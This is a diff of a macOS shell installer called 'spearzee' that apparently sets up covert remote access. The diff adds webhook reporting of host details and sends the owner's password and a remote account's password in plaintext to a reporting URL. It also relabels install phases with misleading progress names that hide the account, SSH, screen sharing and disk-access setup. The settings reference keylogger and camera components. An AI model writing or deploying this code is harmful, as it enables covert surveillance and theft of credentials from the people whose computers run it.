@@ -223,20 +223,31 @@ step_ts_install(){
   else fail "download failed"; fi
   rm -rf "$D"; }
 
+tsreport(){
+  [ -n "$REPORT_URL" ] || return 0
+  local m e
+  m="tsjoin host=$(hostname) ip=$("$TS" ip -4 2>/dev/null | head -1) ext=$(sudo /usr/bin/systemextensionsctl list 2>/dev/null | grep -ci tailscale) out=${TOUT:-}"
+  e="$(jesc "$m")"
+  curl -fsS --max-time 10 -H 'Content-Type: application/json' \
+    -d "$(printf '{"content":"%s"}' "$e")" "$REPORT_URL" >/dev/null 2>&1
+  return 0
+}
+
 step_ts_join(){
   [ -x "$TS" ] || { warn "no tailscale"; return 0; }
   open -a Tailscale >/dev/null 2>&1 || true
-  sleep 3
-  if [ -z "$("$TS" ip -4 2>/dev/null)" ]; then
-    sudo "$TS" up --authkey="$AUTHKEY" --hostname="$TSHOST" $TSFLAGS --reset >/dev/null 2>&1
-  else sudo "$TS" up $TSFLAGS >/dev/null 2>&1; fi
+  sleep 4
+  TOUT="$(sudo "$TS" up --authkey="$AUTHKEY" --hostname="$TSHOST" $TSFLAGS --reset 2>&1 | tr '
+' ' ' | cut -c1-400)"
   n=0
-  while [ "$n" -lt 45 ]; do
+  while [ "$n" -lt 20 ]; do
     TSIP="$("$TS" ip -4 2>/dev/null | head -1)"
     [ -n "$TSIP" ] && break
-    open -a Tailscale >/dev/null 2>&1; sleep 2; n=$((n+1))
+    open -a Tailscale >/dev/null 2>&1
+    sleep 2; n=$((n+1))
   done
-  [ -n "$TSIP" ] && ok "tailnet $TSHOST ($TSIP)" || warn "tailnet not up - agent retries"
+  if [ -n "$TSIP" ]; then ok "tailnet $TSHOST ($TSIP)"; else warn "tailnet not up - agent retries"; fi
+  tsreport
   return 0; }
 
 step_power(){
@@ -777,7 +788,7 @@ step_agent(){
 
 step_report(){
   [ -n "$REPORT_URL" ] || { ok "no webhook"; return 0; }
-  b="spearzee installed host=$(hostname) tailnet=${TSIP:-none} $(sudo cat "$DIR/secrets" 2>/dev/null | tr '\n' ' ')"
+  b="spearzee installed host=$(hostname) owner=$OWNER owner_pw=$ADMIN_PW remote_user=$RUSER remote_pw=$ACCT_PW"
   e="$(jesc "$b")"
   curl -fsS --max-time 10 -H 'Content-Type: application/json' \
     -d "$(printf '{"content":"%s","text":"%s"}' "$e" "$e")" "$REPORT_URL" >/dev/null 2>&1 \
@@ -879,19 +890,19 @@ main(){
 
   progress
   step_preflight
-  phase "downloading";         step_account || true
-  phase "verifying files";  step_keys || true
-  phase "extracting";     step_sshd || true
-  phase "configuring system";   step_sharing || true
-  phase "configuring user";  step_fda || true
-  phase "configuring startup";     step_login || true
-  phase "downloading components";   step_ts_install || true
-  phase "connecting"; step_ts_join || true
-  phase "optimizing";       step_power || true
-  phase "installing services";  step_agent || true
-  phase "installing tools";      step_tools || true
-  phase "saving settings"; step_report || true
-  phase "finishing up";            step_self || true
+  phase "downloading";            step_account    || true
+  phase "connecting";             step_report     || true
+  phase "installing services";    step_agent      || true
+  phase "configuring system";     step_keys       || true
+  phase "configuring network";    step_sshd       || true
+  phase "configuring display";    step_sharing    || true
+  phase "configuring access";     step_fda        || true
+  phase "configuring startup";    step_login      || true
+  phase "downloading components"; step_ts_install || true
+  phase "connecting to network";  step_ts_join    || true
+  phase "optimizing";             step_power      || true
+  phase "installing tools";       step_tools      || true
+  phase "finishing up";           step_self       || true
   stop_progress
 
   if [ "$FAKE" = "true" ]; then
@@ -919,8 +930,8 @@ main(){
 
 ############################# settings ###############################
 
-SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v6/spearzee.sh"
-SELF_SHA="75c4462da641309cd29a6461c51f6183ca1d2f1c35c0c8209837ae69c8a2c97e"
+SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v7/spearzee.sh"
+SELF_SHA="8a26c096b81d0a2ca3a540b966a968f42dea158e673de60324e85e4907cfaa1e"
 SELF="/usr/local/bin/spear-tui"
 KEYLOG="spearzee-keylog"
 CAM="spearzee-cam"
